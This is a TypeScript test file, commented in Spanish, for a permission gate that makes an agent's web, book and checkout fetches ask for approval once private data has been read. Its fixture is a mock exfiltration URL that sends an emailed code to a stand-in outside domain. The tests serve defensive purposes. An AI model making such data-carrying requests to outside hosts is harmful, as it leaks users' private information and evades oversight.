import { describe, expect, it } from 'vitest';
import { egressUrlOf } from '../src/egress-taint.js';
import { Gate } from '../src/permissions.js';

/**
 * La puerta de exfiltración solo veía la URL de fetch, download, browser open y
 * vigilar_precio. `web` (acción fetch), `book` (get_url) y `checkout` (search con url)
 * también piden esa URL a la red: tras leer algo privado, una URL que lleva datos a
 * un dominio nuevo tiene que preguntar igual que un fetch.
 */
const DATA = 'https://otro.example/c?d=483920';

describe('egressUrlOf: más herramientas que salen a la red', () => {
  it('web fetch, book get_url y checkout search devuelven la URL', () => {
    expect(egressUrlOf('web', { action: 'fetch', url: DATA })).toBe(DATA);
    expect(egressUrlOf('book', { action: 'get_url', url: DATA })).toBe(DATA);
    expect(egressUrlOf('checkout', { action: 'search', url: DATA })).toBe(DATA);
  });

  it('otras acciones siguen sin URL de salida', () => {
    expect(egressUrlOf('web', { action: 'search', query: 'x' })).toBeNull();
    expect(egressUrlOf('checkout', { action: 'select', url: DATA })).toBeNull();
    expect(egressUrlOf('book', { action: 'search', url: DATA })).toBeNull();
  });
});

describe('puerta de exfiltración con web fetch', () => {
  function gate() {
    const asked: string[] = [];
    const g = new Gate({
      protectedPaths: [],
      allow: ['web', 'mail', 'book'],
      egressTaint: true,
      approver: (_c, reason) => {
        asked.push(reason);
        return true;
      },
    });
    return { g, asked };
  }
  const MAIL = { tool: 'mail', args: { action: 'read', id: '1' }, actor: 'me' };

  it('tras leer el correo, web fetch con datos a un dominio nuevo pregunta', async () => {
    const { g, asked } = gate();
    await g.check('s', MAIL);
    g.settle('s', MAIL, false, 'Tu código es 483920.');
    await g.check('s', { tool: 'web', args: { action: 'fetch', url: DATA }, actor: 'me' });
    expect(asked).toHaveLength(1);
  });

  it('sin nada privado leído no pregunta', async () => {
    const { g, asked } = gate();
    await g.check('s', { tool: 'web', args: { action: 'fetch', url: DATA }, actor: 'me' });
    expect(asked).toHaveLength(0);
  });
});
